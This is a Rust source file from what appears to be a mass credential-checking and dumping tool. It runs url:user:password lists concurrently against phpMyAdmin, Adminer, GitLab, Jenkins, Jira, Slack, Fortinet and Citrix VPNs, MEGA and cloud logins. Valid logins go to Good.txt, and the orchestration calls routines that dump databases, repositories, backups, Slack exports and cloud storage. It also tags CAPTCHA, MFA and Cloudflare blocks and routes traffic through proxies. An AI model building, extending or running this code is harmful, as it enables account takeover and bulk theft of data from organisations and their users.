//! Shared scan/dump orchestration for CLI and GUI.
//!
//! Source: C# MainViewModel (_vQgh0sjaucl3pGnxc3VkckNe2Bc.cs) + BaseScannerViewModel.

mod mixed;

pub use mixed::{
    download_mixed_checks, init_adminpanel_output_dir, MixedCheckSettings, ADMINPANEL_ERROR_FILE,
};

use anyhow::{Context, Result};
use chrono::Local;
use pma_core::{
    output_file_path,
    parse_mixed_list_summary, MixedParseSummary,
    parse_bitrix_list_summary, parse_credential_list_summary, parse_gitlab_list_summary,
    parse_bamboo_list_summary, parse_jenkins_list_summary, parse_bitbucket_list_summary, parse_jira_list_summary,
    parse_redmine_list_summary, parse_snowflake_list_summary,
    parse_confluence_list_summary, parse_opencart_list_summary, parse_workflowy_list_summary,
    parse_note_export_list_summary, NoteExportService, NoteExportParseSummary,
    parse_crm_export_list_summary, CrmExportService, CrmExportParseSummary,
    parse_roamresearch_list_summary, parse_secondbrain_list_summary, parse_appflowy_list_summary,
    parse_service_list_summary, AddServiceKind, ServiceParseSummary,
    parse_xwiki_list_summary,
    parse_citrix_list_summary, parse_fortinet_list_summary, parse_slack_list_summary,
    parse_phppgadmin_list_summary, parse_adminer_list_summary, parse_mega_list_summary,
    parse_cloud_list_summary, CloudParseSummary, CloudProvider,
    AdminerParseSummary, BambooParseSummary, BitbucketParseSummary, BitrixParseSummary, CitrixParseSummary, Credential, FortinetParseSummary, GitLabParseSummary, JiraParseSummary, RedmineParseSummary, SnowflakeParseSummary, XWikiParseSummary,
    ConfluenceParseSummary, OpencartParseSummary, WorkflowyParseSummary, RoamresearchParseSummary, SecondbrainParseSummary, AppflowyParseSummary,
    MegaParseSummary,
    is_xwiki_wiki_target,
    JenkinsParseSummary, PhpPgAdminParseSummary, SlackParseSummary,
    ParseSummary, ScanResult, ScanStatus,
};
use pma_net::{
    download_adminer_account, download_bamboo_account, download_jira_projects, download_redmine_projects,
    download_snowflake_account,
    download_confluence_account, download_opencart_account,
    download_workflowy_account, download_roamresearch_account, download_secondbrain_account, download_appflowy_account,
    download_note_export_with_runtime, note_app_spec, NoteExportClientConfig, NoteRuntime, NoteRuntimeConfig,
    proxy_manager_from_run,
    download_crm_export_with_runtime, crm_app_spec,
    NoteAppAccountStats,
    download_webapp_account, WebappClientConfig,
    download_xwiki_content, download_citrix_account, download_fortinet_account, download_personal_backups,
    download_personal_jobs,
    download_phppgadmin_dumps as phppgadmin_fetch_personal_dumps,
    download_phpmyadmin_account,
    download_personal_projects, download_personal_repos,
    download_slack_exports,
    download_mega_account, mega_is_banned_anyhow, scan_status_for_mega_anyhow,
    cloud_retryable_with_other_proxy, download_cloud_account, cloud_client_config_for_index,
    CloudAccountStats, CloudClientConfig,
    megax_cloud_workers, megax_curl_parallel,
    dump_databases, scan_credential,
    AdminerClientConfig, BambooClientConfig, BitbucketClientConfig, BitrixClientConfig, GitLabClientConfig, JiraClientConfig, RedmineClientConfig, RedmineExportOptions, SnowflakeClientConfig, SnowflakeExportOptions, XWikiClientConfig,
    ConfluenceClientConfig, OpencartClientConfig, WorkflowyClientConfig, RoamresearchClientConfig, SecondbrainClientConfig, AppflowyClientConfig,
    JenkinsClientConfig, CitrixClientConfig, FortinetClientConfig, MegaClientConfig, PhpPgAdminClientConfig, SlackClientConfig,
    PhpMyAdminClient, PhpMyAdminClientConfig,
    LoginOutcome,
};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use tokio::fs;
use tokio::io::AsyncWriteExt;
use tokio::sync::{mpsc, Mutex, Semaphore};
use tracing::{info, warn};

/// Progress events emitted during scan/dump operations.
#[derive(Debug, Clone)]
pub enum ProgressEvent {
    Log(String),
    ScanResult(ScanResult),
    ScanComplete { valid: usize, total: usize },
    DumpStarted { target: String },
    DumpComplete { target: String, files: usize, bytes: Option<u64> },
    DumpFailed { target: String, error: String },
    /// Successful GitLab/Jenkins/Bitrix/Bitbucket hit with account details for the visible Good log.
    Good {
        target: String,
        detail: String,
        bytes: Option<u64>,
    },
    AllComplete,
}

pub type ProgressCallback = Arc<dyn Fn(ProgressEvent) + Send + Sync>;

fn cancelled(cancel: &Option<Arc<AtomicBool>>) -> bool {
    cancel.as_ref().is_some_and(|f| f.load(Ordering::Relaxed))
}

async fn wait_while_paused(pause: &Option<Arc<AtomicBool>>, cancel: &Option<Arc<AtomicBool>>) {
    loop {
        if cancelled(cancel) {
            return;
        }
        if !pause.as_ref().is_some_and(|p| p.load(Ordering::Relaxed)) {
            return;
        }
        tokio::time::sleep(std::time::Duration::from_millis(200)).await;
    }
}

async fn await_download_handles(
    handles: Vec<tokio::task::JoinHandle<()>>,
    cancel: &Option<Arc<AtomicBool>>,
) {
    if cancelled(cancel) {
        for handle in handles {
            handle.abort();
        }
    } else {
        for handle in handles {
            let _ = handle.await;
        }
    }
}

pub async fn load_credential_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_credential_list_summary(path).await?.credentials)
}

/// Load and parse a target list, returning skip statistics.
pub async fn load_credential_list_summary(
    path: &Path,
) -> Result<pma_core::ParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_credential_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid targets in {} ({} lines checked, {} skipped)",
            path.display(),
            summary.total_lines,
            summary.skipped
        );
    }
    Ok(summary)
}

async fn read_list_file(path: &Path) -> Result<String> {
    let bytes = fs::read(path)
        .await
        .with_context(|| format!("read {}", path.display()))?;

    // UTF-8 BOM
    if bytes.starts_with(&[0xEF, 0xBB, 0xBF]) {
        return String::from_utf8(bytes[3..].to_vec()).context("UTF-8 decode failed");
    }

    // UTF-16 LE BOM (common on Windows)
    if bytes.starts_with(&[0xFF, 0xFE]) {
        let u16: Vec<u16> = bytes[2..]
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        return String::from_utf16(&u16).context("UTF-16 LE decode failed");
    }

    String::from_utf8(bytes).context("UTF-8 decode failed (try saving the list as UTF-8)")
}

/// Directory for `Good.txt` when no explicit output dir is given.
pub fn default_valid_output_dir(input: &Path, output: Option<&Path>) -> PathBuf {
    output
        .map(Path::to_path_buf)
        .or_else(|| input.parent().map(Path::to_path_buf))
        .unwrap_or_else(|| PathBuf::from("."))
}

/// Detailed error log for fixing failed lines after a run.
pub const ERROR_LOG_FILENAME: &str = "Errors.log";
pub const GOOD_LOG_FILENAME: &str = "Good.log";

const RESULT_BUCKET_FILES: &[&str] = &[
    "Good.txt",
    "Bad.txt",
    "Error.txt",
    "CantCheck.txt",
    "2FA.txt",
];

/// Prepare output dir for a new run: empty bucket files + `Errors.log`.
pub async fn init_run_output_dir(dir: &Path) -> Result<PathBuf> {
    fs::create_dir_all(dir).await?;
    for name in RESULT_BUCKET_FILES {
        fs::File::create(dir.join(name)).await?;
    }
    let error_log = dir.join(ERROR_LOG_FILENAME);
    let mut log = fs::File::create(&error_log).await?;
    log.write_all(
        format!(
            "# Errors.log — run started {}\n# format: [time]\\tTAG\\ttarget_line\\terror_detail\n# tags: NETWORK|NOT_N8N|AUTH|AUTH_MFA|AUTH_SSO|NOT_SLACK|SLACK_APP_URL|ERROR|OTHER (see classify_error_tag)\n",
            Local::now().format("%Y-%m-%d %H:%M:%S")
        )
        .as_bytes(),
    )
    .await?;
    log.flush().await?;
    Ok(error_log)
}

/// `Good.txt` + fresh `Errors.log` only (no empty Bad/Error bucket files).
pub async fn init_run_output_dir_good_only(dir: &Path) -> Result<PathBuf> {
    fs::create_dir_all(dir).await?;
    fs::File::create(dir.join("Good.txt")).await?;
    let error_log = dir.join(ERROR_LOG_FILENAME);
    let mut log = fs::File::create(&error_log).await?;
    log.write_all(
        format!(
            "# Errors.log — run started {}\n# format: [time]\\tTAG\\ttarget_line\\terror_detail\n",
            Local::now().format("%Y-%m-%d %H:%M:%S")
        )
        .as_bytes(),
    )
    .await?;
    log.flush().await?;
    Ok(error_log)
}

/// Fresh `Errors.log` only — no `Good.txt` or empty bucket files (mass error-only runs).
pub async fn init_run_output_dir_errors_only(dir: &Path) -> Result<PathBuf> {
    fs::create_dir_all(dir).await?;
    let error_log = dir.join(ERROR_LOG_FILENAME);
    let mut log = fs::File::create(&error_log).await?;
    log.write_all(
        format!(
            "# Errors.log — run started {}\n# format: [time]\\tTAG\\ttarget_line\\terror_detail\n# tags: NETWORK|AUTH|NOT_PGADMIN|ERROR|OTHER (see classify_error_tag)\n",
            Local::now().format("%Y-%m-%d %H:%M:%S")
        )
        .as_bytes(),
    )
    .await?;
    log.flush().await?;
    Ok(error_log)
}

fn notify_error_log(path: &Path, on_progress: Option<&ProgressCallback>) {
    if let Some(cb) = on_progress {
        cb(ProgressEvent::Log(format!("Error log: {}", path.display())));
    }
}

/// Truncate/create the C#-style valid-target bucket (`Good.txt`).
pub async fn init_valid_lines_file(dir: &Path) -> Result<PathBuf> {
    init_run_output_dir(dir).await
}

/// Append one successful credential line to `Good.txt`.
pub async fn append_valid_credential(dir: &Path, cred: &Credential) -> Result<()> {
    record_scan_result(
        dir,
        &ScanResult {
            credential: cred.clone(),
            status: ScanStatus::Valid,
            message: None,
            databases: Vec::new(),
        },
    )
    .await
}

async fn ensure_error_log_header(dir: &Path) -> Result<()> {
    let path = dir.join(ERROR_LOG_FILENAME);
    if fs::try_exists(&path).await.unwrap_or(false) {
        return Ok(());
    }
    fs::create_dir_all(dir).await?;
    let mut log = fs::File::create(&path).await?;
    log.write_all(
        format!(
            "# Errors.log — started {}\n# format: [time]\\tTAG\\ttarget_line\\terror_detail\n# tags: NETWORK|NOT_GITLAB|NOT_BITBUCKET|NOT_JIRA|NOT_XWIKI|NOT_BAMBOO|NOT_SLACK|SLACK_APP_URL|NOT_ONENOTE|NOT_SENDSECURE|UNSUPPORTED_SENDSECURE|AUTH|NO_PROJECTS|BAD|CAPTCHA|INVALID|ERROR|OTHER\n",
            Local::now().format("%Y-%m-%d %H:%M:%S")
        )
        .as_bytes(),
    )
    .await?;
    Ok(())
}

/// Map export/check error text to scan status (GUI counters + bucket files stay aligned).
pub fn scan_status_from_export_error(message: &str) -> ScanStatus {
    let tag = classify_error_tag(ScanStatus::Error, Some(message));
    match tag {
        "AUTH" | "AUTH_SSO" => ScanStatus::InvalidCredentials,
        "NETWORK" => ScanStatus::Unreachable,
        "CAPTCHA" | "AUTH_MFA" => ScanStatus::Captcha,
        _ => ScanStatus::Error,
    }
}

pub fn classify_error_tag(status: ScanStatus, message: Option<&str>) -> &'static str {
    let msg = message.unwrap_or("").to_ascii_lowercase();
    if status == ScanStatus::Unreachable {
        return "NETWORK";
    }
    if status == ScanStatus::Captcha {
        return "CAPTCHA";
    }
    if msg.contains("zoho: account not registered") {
        return "NOT_ZOHO";
    }
    if msg.contains("cloud network:") && msg.contains("zoho iam") {
        return "NETWORK";
    }
    if msg.contains("cloud captcha:") {
        return "CAPTCHA";
    }
    if msg.contains("cloud network:")
        || msg.contains("cloud rate limit:")
        || msg.contains("curl-impersonate")
        || msg.contains(" over proxy ")
    {
        return "NETWORK";
    }
    if msg.contains("get failed")
        || msg.contains("adminer http 502")
        || msg.contains("adminer http 503")
        || msg.contains("adminer http 504")
    {
        return "NETWORK";
    }
    if msg.contains("cannot reach")
        || msg.contains("cannot reach phppgadmin")
        || msg.contains("no http response from host")
        || msg.contains("error sending request")
        || msg.contains("timed out")
        || msg.contains("dns error")
        || msg.contains("connection")
    {
        return "NETWORK";
    }
    if msg.contains("pgadmin3 is not supported")
        || msg.contains("not phppgadmin")
        || msg.contains("phppgadmin/pgadmin")
        || msg.contains("does not look like phppgadmin")
    {
        return "NOT_PGADMIN";
    }
    if msg.contains("not phpmyadmin") || msg.contains("no phpmyadmin login page") {
        return "NOT_PMA";
    }
    if msg.contains("not adminer") || msg.contains("does not look like adminer") {
        return "NOT_ADMINER";
    }
    if msg.contains("not a gitlab")
        || msg.contains("not a jenkins")
        || msg.contains("not a bitrix")
        || msg.contains("no /api/v4/version")
    {
        return "NOT_GITLAB";
    }
    if msg.contains("not a bitbucket")
        || msg.contains("not a bitbucket server")
        || msg.contains("bitbucket.org is bitbucket cloud")
        || msg.contains("application-properties bitbucket")
    {
        return "NOT_BITBUCKET";
    }
    if msg.contains("not a jira")
        || msg.contains("serverinfo json")
    {
        return "NOT_JIRA";
    }
    if msg.contains("not a redmine")
        || msg.contains("no /projects.json")
        || msg.contains("redmine login failed")
    {
        return "NOT_REDMINE";
    }
    if msg.contains("not an xwiki")
        || msg.contains("not a xwiki")
        || msg.contains("not a private xwiki")
        || msg.contains("public/community site")
    {
        return "NOT_XWIKI";
    }
    if msg.contains("not a bamboo") || msg.contains("not atlassian bamboo ci") {
        return "NOT_BAMBOO";
    }
    if msg.contains("bamboo s3 storage failed") || msg.contains("s3 authentication failed") {
        return "AUTH";
    }
    if msg.contains("bamboo s3:") || msg.contains("s3 get ") || msg.contains("s3 list buckets") {
        return "ERROR";
    }
    if msg.contains("not an n8n") || msg.contains("not a n8n") || msg.contains("n8n cloud instance") {
        return "NOT_N8N";
    }
    if msg.contains("not a citrix")
        || msg.contains("citrix netscaler/gateway vpn portal")
    {
        return "NOT_CITRIX";
    }
    if msg.contains("not a fortinet")
        || msg.contains("not fortinet")
        || msg.contains("fortigate portal")
        || msg.contains("fortinet/fortigate portal")
    {
        return "NOT_FORTINET";
    }
    if msg.contains("workflow vendor keys only") {
        return "NOT_N8N";
    }
    if msg.contains("not a slack") || msg.contains("slack workspace") {
        return "NOT_SLACK";
    }
    if msg.contains("use https://workspace.slack.com with email:password (not app.slack.com)") {
        return "SLACK_APP_URL";
    }
    if msg.contains("not a onenote") || msg.contains("microsoft graph /me/onenote") {
        return "NOT_ONENOTE";
    }
    if msg.contains("unsupported sendsecure platform") {
        return "UNSUPPORTED_SENDSECURE";
    }
    if msg.contains("not a sendsecure") || msg.contains("sendsecure portal") {
        return "NOT_SENDSECURE";
    }
    if msg.contains("sso_required")
        || msg.contains("sso required")
        || msg.contains("oauth2/kerberos/sso login")
        || msg.contains("requires oauth2")
    {
        return "AUTH_SSO";
    }
    if msg.contains("does not look like pgadmin4") {
        return "NOT_PGADMIN";
    }
    if msg.contains("mfa_required")
        || msg.contains("two_factor")
        || msg.contains("two-factor")
        || msg.contains("duo")
        || msg.contains("totp")
        || msg.contains("multi-factor")
        || msg.contains("390104")
        || msg.contains("390105")
        || msg.contains("2fa")
        || msg.contains("n8n mfa required")
        || msg.contains("captcha required")
        || msg.contains("cloudflare")
        || msg.contains("recaptcha")
        || msg.contains("hcaptcha")
        || msg.contains("challenge")
    {
        return "AUTH_MFA";
    }
    if msg.contains("failed to export any") || msg.contains("export failed for") {
        return "ERROR";
    }
    if msg.contains("authentication failed")
        || msg.contains("login failed")
        || msg.contains("slack login failed")
        || msg.contains("n8n login failed")
        || msg.contains("fortinet login failed")
        || msg.contains("citrix vpn login failed")
        || msg.contains("username-only rejected")
        || msg.contains("slack authentication failed")
        || msg.contains("bamboo login failed")
        || msg.contains("bamboo authentication failed")
        || msg.contains("xwiki login failed")
        || msg.contains("xwiki authentication failed")
        || msg.contains("snowflake login failed")
        || msg.contains("incorrect username or password")
        || msg.contains("390100")
        || msg.contains("390102")
        || msg.contains("session expired")
        || (msg.contains("csrf") && !msg.contains("missing csrf"))
        || msg.contains("sign-in")
        || msg.contains("401")
        || status == ScanStatus::InvalidCredentials
    {
        return "AUTH";
    }
    if msg.contains("no postgresql databases")
        || msg.contains("no databases found in ui")
        || msg.contains("no databases visible")
    {
        return "NO_DATABASES";
    }
    if msg.contains("no owned")
        || msg.contains("no jenkins jobs")
        || msg.contains("no bitbucket")
        || msg.contains("no jira")
        || msg.contains("no xwiki")
        || msg.contains("no projects")
        || msg.contains("no bitrix")
        || msg.contains("no backups")
        || msg.contains("bitrix backups")
    {
        return "NO_PROJECTS";
    }
    match status {
        ScanStatus::Captcha => "CAPTCHA",
        ScanStatus::NotPhpMyAdmin => "NOT_PMA",
        ScanStatus::Unreachable => "NETWORK",
        ScanStatus::InvalidCredentials => "AUTH",
        ScanStatus::Error => "ERROR",
        ScanStatus::Valid => "OTHER",
    }
}

/// Bucket file for a failed / special result (AdminPanel + export GUIs).
/// AUTH → Bad.txt, NETWORK → Error.txt, ERROR → CantCheck.txt, captcha/2FA → 2FA.txt.
pub fn failure_bucket_filename(status: ScanStatus, message: Option<&str>) -> &'static str {
    if status == ScanStatus::Valid {
        return "Good.txt";
    }
    match classify_error_tag(status, message) {
        "AUTH" | "AUTH_SSO" => "Bad.txt",
        "NETWORK" => "Error.txt",
        "CAPTCHA" | "AUTH_MFA" => "2FA.txt",
        _ => "CantCheck.txt",
    }
}

pub async fn append_error_log(dir: &Path, cred_line: &str, error: &str) -> Result<()> {
    append_error_log_tagged(dir, "ERROR", cred_line, error).await
}

pub async fn append_error_log_tagged(
    dir: &Path,
    tag: &str,
    cred_line: &str,
    error: &str,
) -> Result<()> {
    ensure_error_log_header(dir).await?;
    let mut file = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(dir.join(ERROR_LOG_FILENAME))
        .await?;
    let ts = Local::now().format("%Y-%m-%d %H:%M:%S");
    let detail = error.replace('\t', " ").replace('\n', " ");
    let safe_target = redact_credential_line(cred_line);
    file.write_all(format!("[{ts}]\t{tag}\t{safe_target}\t{detail}\n").as_bytes())
        .await?;
    Ok(())
}

fn redact_credential_line(line: &str) -> String {
    let Some(at) = line.find('@') else {
        return line.to_string();
    };
    let Some(colon_offset) = line[at..].find(':') else {
        return line.to_string();
    };
    let colon = at + colon_offset;
    if colon + 1 >= line.len() {
        return line.to_string();
    }
    format!("{}:***", &line[..colon])
}

async fn ensure_good_log_header(dir: &Path) -> Result<()> {
    let path = dir.join(GOOD_LOG_FILENAME);
    if fs::try_exists(&path).await.unwrap_or(false) {
        return Ok(());
    }
    fs::create_dir_all(dir).await?;
    let mut log = fs::File::create(&path).await?;
    log.write_all(
        format!(
            "# Good.log — run started {}\n# format: [time]\\tGood\\ttarget_line\\tlogin ok at [time]; user=… databases=… downloaded=…\n",
            Local::now().format("%Y-%m-%d %H:%M:%S")
        )
        .as_bytes(),
    )
    .await?;
    Ok(())
}

/// Timestamped success line (phpPgAdmin mass runs: only Good.log, not Good.txt bucket).
pub async fn append_good_log(dir: &Path, cred_line: &str, detail: &str) -> Result<()> {
    ensure_good_log_header(dir).await?;
    let mut file = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(dir.join(GOOD_LOG_FILENAME))
        .await?;
    let ts = Local::now().format("%Y-%m-%d %H:%M:%S");
    let detail = detail.replace('\t', " ").replace('\n', " ");
    file.write_all(format!("[{ts}]\tGood\t{cred_line}\t{detail}\n").as_bytes())
        .await?;
    Ok(())
}

async fn append_bad_credential_line(dir: &Path, cred_line: &str) -> Result<()> {
    fs::create_dir_all(dir).await?;
    let path = dir.join("Bad.txt");
    let mut file = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .await?;
    file.write_all(format!("{cred_line}\n").as_bytes()).await?;
    Ok(())
}

fn mass_sql_error_tag_is_good_bucket(tag: &str) -> bool {
    matches!(
        tag,
        "NOT_PGADMIN" | "NOT_PMA" | "NOT_ADMINER" | "NO_PROJECTS" | "NO_DATABASES"
    )
}

/// Mass SQL: Good.log only on real success; failures → Errors.log (+ Bad.txt except NOT_* junk).
async fn record_mass_sql_outcome(
    dir: &Path,
    result: &ScanResult,
    cb: &Option<ProgressCallback>,
) -> Result<()> {
    let target_line = result.credential.display_line();
    if result.is_valid() {
        return Ok(());
    }
    let detail = result
        .message
        .as_deref()
        .unwrap_or(result.status.label());
    let tag = classify_error_tag(result.status, result.message.as_deref());

    if mass_sql_error_tag_is_good_bucket(tag) {
        let good_detail = format!("[{tag}] {detail}");
        let bucket = ScanResult {
            credential: result.credential.clone(),
            status: ScanStatus::Valid,
            message: Some(good_detail),
            databases: result.databases.clone(),
        };
        append_result_bucket(dir, &bucket).await?;
        emit_scan_result(cb, &bucket);
    } else {
        append_bad_credential_line(dir, &target_line).await?;
        append_error_log_tagged(dir, tag, &target_line, detail).await?;
        emit_scan_result(cb, result);
    }
    Ok(())
}

async fn site_tree_has_files(path: &Path) -> bool {
    if site_tree_has_files_async(path).await {
        return true;
    }
    site_tree_has_files_sync(path)
}

async fn site_tree_has_files_async(path: &Path) -> bool {
    let mut stack = vec![path.to_path_buf()];
    while let Some(dir) = stack.pop() {
        let Ok(mut entries) = fs::read_dir(&dir).await else {
            continue;
        };
        while let Ok(Some(entry)) = entries.next_entry().await {
            let Ok(file_type) = entry.file_type().await else {
                continue;
            };
            if file_type.is_file() {
                return true;
            }
            if file_type.is_dir() {
                stack.push(entry.path());
            }
        }
    }
    false
}

fn site_tree_has_files_sync(path: &Path) -> bool {
    let Ok(read) = std::fs::read_dir(path) else {
        return false;
    };
    for entry in read.flatten() {
        let Ok(file_type) = entry.file_type() else {
            continue;
        };
        if file_type.is_file() {
            return true;
        }
        if file_type.is_dir() && site_tree_has_files_sync(&entry.path()) {
            return true;
        }
    }
    false
}

async fn remove_site_tree_if_no_files(path: &Path) {
    let existed = fs::try_exists(path).await.unwrap_or(false);
    if !existed {
        return;
    }
    let had_files = site_tree_has_files(path).await;
    // #region agent log
    agent_log(
        "H3",
        "app/lib.rs:remove_site_tree_if_no_files",
        "cleanup decision",
        &format!(
            r#"{{"site_dir":"{}","had_files":{},"will_remove":{}}}"#,
            json_escape(&path.display().to_string()),
            had_files,
            !had_files
        ),
    );
    // #endregion
    if had_files {
        return;
    }
    let _ = fs::remove_dir_all(path).await;
}

// #region agent log
fn agent_log(hypothesis_id: &str, location: &str, message: &str, data_json: &str) {
    use std::fs::OpenOptions;
    use std::io::Write;
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let line = format!(
        r#"{{"sessionId":"be3b27","hypothesisId":"{}","location":"{}","message":"{}","data":{},"timestamp":{},"runId":"pgadmin-cleanup"}}"#,
        hypothesis_id, location, message, data_json, ts
    );
    if let Ok(mut f) = OpenOptions::new()
        .create(true)
        .append(true)
        .open(r"C:\Users\beakd\Documents\MEGA\1\debug-be3b27.log")
    {
        let _ = writeln!(f, "{line}");
    }
}

fn json_escape(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"")
}
// #endregion

/// Write bucket file + `Errors.log` entry for a finished target.
pub async fn record_scan_result(dir: &Path, result: &ScanResult) -> Result<()> {
    append_result_bucket(dir, result).await?;
    if !result.is_valid() {
        let detail = result
            .message
            .as_deref()
            .unwrap_or(result.status.label());
        let tag = classify_error_tag(result.status, result.message.as_deref());
        append_error_log_tagged(dir, tag, &result.credential.display_line(), detail).await?;
    }
    Ok(())
}

pub async fn scan_targets(
    creds: Vec<Credential>,
    config: Arc<PhpMyAdminClientConfig>,
    threads: usize,
    valid_output_dir: Option<&Path>,
    on_progress: Option<ProgressCallback>,
) -> Result<Vec<ScanResult>> {
    if let Some(dir) = valid_output_dir {
        let error_log = init_run_output_dir(dir).await?;
        notify_error_log(&error_log, on_progress.as_ref());
    }

    let valid_dir = valid_output_dir.map(Path::to_path_buf);
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let cb = on_progress.clone();
        let out_dir = valid_dir.clone();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            let result = scan_credential(&cred, &cfg).await;
            if let Some(ref dir) = out_dir {
                let _ = record_scan_result(dir, &result).await;
            }
            let log_line = format_scan_log(&result);
            if let Some(ref callback) = cb {
                callback(ProgressEvent::Log(log_line));
                callback(ProgressEvent::ScanResult(result.clone()));
            } else {
                match result.status {
                    ScanStatus::Valid => info!("VALID  {}", cred.display_line()),
                    ScanStatus::InvalidCredentials => info!("INVALID {}", cred.display_line()),
                    ScanStatus::NotPhpMyAdmin => info!("NO_PMA {}", cred.display_line()),
                    ScanStatus::Captcha => info!("CAPTCHA {}", cred.display_line()),
                    ScanStatus::Unreachable => info!("DOWN   {}", cred.display_line()),
                    ScanStatus::Error => warn!(
                        "ERROR  {} — {}",
                        cred.display_line(),
                        result.message.as_deref().unwrap_or("unknown")
                    ),
                }
            }
            result
        }));
    }

    let mut results = Vec::new();
    for handle in handles {
        results.push(handle.await?);
    }

    let valid = results.iter().filter(|r| r.is_valid()).count();
    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::ScanComplete {
            valid,
            total: results.len(),
        });
    } else {
        info!("scan complete: {valid} valid / {} total", results.len());
    }
    if let Some(dir) = valid_output_dir {
        if valid > 0 {
            if let Some(name) = ScanStatus::Valid.bucket_filename() {
                info!("wrote {valid} valid targets to {}", dir.join(name).display());
            }
        }
        info!("error log: {}", dir.join(ERROR_LOG_FILENAME).display());
    }

    Ok(results)
}

pub async fn write_valid_targets(results: &[ScanResult], path: &Path) -> Result<usize> {
    let valid: Vec<_> = results.iter().filter(|r| r.is_valid()).collect();
    let mut file = fs::File::create(path).await?;
    for result in &valid {
        file.write_all(format_bucket_record(result).as_bytes())
            .await?;
    }
    if !valid.is_empty() {
        info!("wrote {} valid targets to {}", valid.len(), path.display());
    }
    Ok(valid.len())
}

fn sanitize_bucket_detail(detail: &str) -> String {
    detail
        .chars()
        .map(|c| if c == '\n' || c == '\r' || c == '\t' { ' ' } else { c })
        .collect::<String>()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

pub(crate) fn format_bucket_record(result: &ScanResult) -> String {
    let cred = result.credential.display_line();
    if result.status == ScanStatus::Valid {
        if let Some(detail) = result
            .message
            .as_ref()
            .map(|s| s.trim())
            .filter(|s| !s.is_empty() && *s != cred)
        {
            let detail = sanitize_bucket_detail(detail);
            return format!("{cred}\t{detail}\n");
        }
    }
    format!("{cred}\n")
}

/// AdminPanel `Good_<Service>.txt`: one physical line — combo, file count, size.
pub(crate) fn format_adminpanel_good_line(result: &ScanResult) -> String {
    let cred = sanitize_bucket_detail(&result.credential.display_line());
    if result.status != ScanStatus::Valid {
        return format!("{cred}\n");
    }
    let msg = result
        .message
        .as_deref()
        .map(sanitize_bucket_detail)
        .unwrap_or_default();
    let (mut count, size_label) = export_stats_from_message(&msg);
    if count == 0 {
        count = 1;
    }
    if msg.is_empty() {
        return format!("{cred}\t{count}\t{size_label}\n");
    }
    format!("{cred}\t{count}\t{size_label}\t{msg}\n")
}

fn export_stats_from_message(msg: &str) -> (usize, String) {
    let lower = msg.to_ascii_lowercase();
    let mut count = parse_usize_after_key(&lower, "export_files=")
        .or_else(|| parse_usize_after_key(&lower, "dbs="))
        .unwrap_or(0);
    if count == 0 {
        for key in [
            "hosts=",
            "dashboards=",
            "projects=",
            "issues=",
            "items=",
            "messages=",
            "session=",
        ] {
            if let Some(n) = parse_usize_after_key(&lower, key) {
                count = count.saturating_add(n);
            }
        }
    }
    let size_label = msg
        .rsplit('(')
        .next()
        .and_then(|tail| tail.strip_suffix(')'))
        .map(str::trim)
        .filter(|s| !s.is_empty() && s.chars().any(|c| c.is_ascii_digit()))
        .map(str::to_string)
        .unwrap_or_else(|| "0 B".to_string());
    (count, size_label)
}

fn parse_usize_after_key(lower_msg: &str, key: &str) -> Option<usize> {
    let idx = lower_msg.find(key)?;
    let rest = &lower_msg[idx + key.len()..];
    let digits: String = rest.chars().take_while(|c| c.is_ascii_digit()).collect();
    digits.parse().ok()
}

#[cfg(test)]
mod format_bucket_tests {
    use super::*;
    use pma_core::{Credential, ScanStatus};
    use url::Url;

    #[test]
    fn adminpanel_good_one_line_with_count() {
        let result = ScanResult {
            credential: Credential {
                url: Url::parse("http://host/zabbix").unwrap(),
                username: "admin".into(),
                password: "x".into(),
            },
            status: ScanStatus::Valid,
            message: Some(
                "check ok — Zabbix user=admin auth=form totals=n/a export_files=0 (0 B)".into(),
            ),
            databases: Vec::new(),
        };
        let line = format_adminpanel_good_line(&result);
        assert_eq!(line.matches('\n').count(), 1);
        let body = line.trim_end();
        assert!(!body.contains('\n'));
        assert!(body.starts_with("http://host/zabbix:admin:x\t"));
        assert!(body.contains("\t1\t"));
    }

    fn sample_result(message: Option<&str>) -> ScanResult {
        ScanResult {
            credential: Credential {
                url: Url::parse("https://grafana.example.com").unwrap(),
                username: "admin".into(),
                password: "secret".into(),
            },
            status: ScanStatus::Valid,
            message: message.map(str::to_string),
            databases: Vec::new(),
        }
    }

    #[test]
    fn valid_record_is_one_physical_line() {
        let line = format_bucket_record(&sample_result(Some(
            "check ok — Grafana export_files=12 (0 B)",
        )));
        assert_eq!(line.matches('\n').count(), 1);
        assert!(line.starts_with("https://grafana.example.com:admin:secret\t"));
    }

    #[test]
    fn detail_newlines_are_collapsed() {
        let line = format_bucket_record(&sample_result(Some("line1\nline2\textra")));
        assert!(!line.contains('\n') || line.ends_with('\n'));
        let body = line.trim_end();
        assert!(!body.contains('\n'));
        assert!(body.contains("line1 line2 extra"));
    }
}

/// Append one line to a C#-style result bucket file (`Good.txt`, `Bad.txt`, …).
pub async fn append_result_bucket(results_dir: &Path, result: &ScanResult) -> Result<()> {
    let filename = if result.is_valid() {
        "Good.txt"
    } else {
        failure_bucket_filename(result.status, result.message.as_deref())
    };
    fs::create_dir_all(results_dir).await?;
    let path = results_dir.join(filename);
    let mut file = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .await?;
    // One write — concurrent tasks interleaving line + `\n` merges records (seen on mass runs).
    file.write_all(format_bucket_record(result).as_bytes())
        .await?;
    Ok(())
}

pub async fn write_result_buckets(results_dir: &Path, results: &[ScanResult]) -> Result<()> {
    fs::create_dir_all(results_dir).await?;
